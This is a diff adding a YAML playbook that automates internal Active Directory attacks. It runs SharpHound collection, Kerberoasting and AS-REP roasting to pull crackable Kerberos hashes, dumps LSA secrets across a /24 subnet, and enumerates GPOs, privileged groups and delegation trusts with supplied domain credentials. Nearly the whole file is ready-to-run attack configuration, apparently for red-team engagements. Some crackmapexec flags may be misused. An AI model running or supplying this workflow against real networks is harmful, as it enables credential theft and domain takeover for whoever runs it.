@@ -1,0 +1,217 @@
+metadata:
+  name: internal-ad-enum
+  version: "1.0"
+  author: "SecWin Team"
+  description: "Active Directory enumeration: BloodHound → Kerberoasting → AS-REP roasting → GPO analysis → Privilege paths"
+  mitre_tactics: ["TA0008", "TA0007", "TA0006"]
+  tags: ["ad", "internal", "bloodhound", "kerberoasting", "privilege-escalation"]
+
+variables:
+  domain:
+    type: string
+    required: true
+    description: "Target domain (e.g., corp.example.com)"
+  dc_ip:
+    type: string
+    required: true
+    description: "Domain Controller IP"
+  username:
+    type: string
+    required: true
+    description: "Domain username"
+  password:
+    type: string
+    required: true
+    description: "Domain password"
+    secret: true
+  output_dir:
+    type: string
+    default: "./engagements/{{.domain}}/internal-ad-enum"
+    description: "Output directory"
+  collection_method:
+    type: string
+    default: "all"
+    enum: ["all", "group", "localadmin", "session", "trusts", "acl", "container", "rdp", "dcom", "psremote"]
+    description: "BloodHound collection methods"
+  enable_kerberoasting:
+    type: boolean
+    default: true
+  enable_asreproasting:
+    type: boolean
+    default: true
+  enable_gpo_analysis:
+    type: boolean
+    default: true
+
+steps:
+  - id: bloodhound_collect
+    name: "BloodHound Data Collection"
+    tool: sharphound
+    args:
+      - "-c"
+      - "{{.collection_method}}"
+      - "-d"
+      - "{{.domain}}"
+      - "--domaincontroller"
+      - "{{.dc_ip}}"
+      - "--username"
+      - "{{.username}}"
+      - "--password"
+      - "{{.password}}"
+      - "--outputdir"
+      - "{{.output_dir}}/bloodhound"
+      - "--zipfilename"
+      - "bloodhound_{{.domain}}.zip"
+    artifacts:
+      - "{{.output_dir}}/bloodhound/*.zip"
+      - "{{.output_dir}}/bloodhound/*.json"
+    mitre_techniques: ["T1069.002", "T1087.002", "T1484.001"]
+    timeout: "30m"
+
+  - id: kerberoasting
+    name: "Kerberoasting Attack"
+    tool: crackmapexec
+    args:
+      - "ldap"
+      - "{{.dc_ip}}"
+      - "-u"
+      - "{{.username}}"
+      - "-p"
+      - "{{.password}}"
+      - "--kerberoasting"
+      - "{{.output_dir}}/kerberoasting.txt"
+    artifacts:
+      - "{{.output_dir}}/kerberoasting.txt"
+    mitre_techniques: ["T1558.003"]
+    timeout: "15m"
+    condition: "{{.enable_kerberoasting}}"
+
+  - id: asrep_roasting
+    name: "AS-REP Roasting"
+    tool: crackmapexec
+    args:
+      - "ldap"
+      - "{{.dc_ip}}"
+      - "-u"
+      - "{{.username}}"
+      - "-p"
+      - "{{.password}}"
+      - "--asreproasting"
+      - "{{.output_dir}}/asrep.txt"
+    artifacts:
+      - "{{.output_dir}}/asrep.txt"
+    mitre_techniques: ["T1558.004"]
+    timeout: "10m"
+    condition: "{{.enable_asreproasting}}"
+
+  - id: gpo_analysis
+    name: "GPO Analysis"
+    tool: crackmapexec
+    args:
+      - "ldap"
+      - "{{.dc_ip}}"
+      - "-u"
+      - "{{.username}}"
+      - "-p"
+      - "{{.password}}"
+      - "--gpo"
+      - "{{.output_dir}}/gpos.txt"
+    artifacts:
+      - "{{.output_dir}}/gpos.txt"
+    mitre_techniques: ["T1484.001"]
+    timeout: "10m"
+    condition: "{{.enable_gpo_analysis}}"
+
+  - id: local_admin_enum
+    name: "Local Admin Enumeration"
+    tool: crackmapexec
+    args:
+      - "smb"
+      - "{{.dc_ip}}/24"
+      - "-u"
+      - "{{.username}}"
+      - "-p"
+      - "{{.password}}"
+      - "--local-auth"
+      - "--lsa"
+      - "{{.output_dir}}/local_admins.txt"
+    artifacts:
+      - "{{.output_dir}}/local_admins.txt"
+    mitre_techniques: ["T1069.001", "T1087.001"]
+    timeout: "20m"
+
+  - id: password_policy
+    name: "Domain Password Policy"
+    tool: crackmapexec
+    args:
+      - "ldap"
+      - "{{.dc_ip}}"
+      - "-u"
+      - "{{.username}}"
+      - "-p"
+      - "{{.password}}"
+      - "--pass-pol"
+      - "{{.output_dir}}/password_policy.txt"
+    artifacts:
+      - "{{.output_dir}}/password_policy.txt"
+    mitre_techniques: ["T1201"]
+    timeout: "5m"
+
+  - id: privileged_groups
+    name: "Privileged Group Enumeration"
+    tool: crackmapexec
+    args:
+      - "ldap"
+      - "{{.dc_ip}}"
+      - "-u"
+      - "{{.username}}"
+      - "-p"
+      - "{{.password}}"
+      - "--groups"
+      - "{{.output_dir}}/groups.txt"
+    artifacts:
+      - "{{.output_dir}}/groups.txt"
+    mitre_techniques: ["T1069.002"]
+    timeout: "10m"
+
+  - id: trust_enum
+    name: "Trust Relationship Enumeration"
+    tool: crackmapexec
+    args:
+      - "ldap"
+      - "{{.dc_ip}}"
+      - "-u"
+      - "{{.username}}"
+      - "-p"
+      - "{{.password}}"
+      - "--trusted-for-delegation"
+      - "{{.output_dir}}/trusts.txt"
+    artifacts:
+      - "{{.output_dir}}/trusts.txt"
+    mitre_techniques: ["T1484.002"]
+    timeout: "5m"
+
+  - id: bloodhound_ingest
+    name: "Ingest BloodHound Data"
+    tool: echo
+    args:
+      - "Import {{.output_dir}}/bloodhound/bloodhound_{{.domain}}.zip into BloodHound UI for graph analysis"
+    artifacts: []
+    mitre_techniques: []
+    timeout: "1m"
+
+outputs:
+  findings: "{{.output_dir}}/findings.json"
+  report: "{{.output_dir}}/report.html"
+  evidence_dir: "{{.output_dir}}"
+
+hooks:
+  pre_step:
+    - tool: echo
+      args: ["[AD Enum] Starting: {{.step.name}}"]
+  post_step:
+    - tool: echo
+      args: ["[AD Enum] Completed: {{.step.name}}"]
+  on_failure:
+    - tool: echo
+      args: ["[AD Enum] FAILED: {{.step.name}} - {{.error}}"]
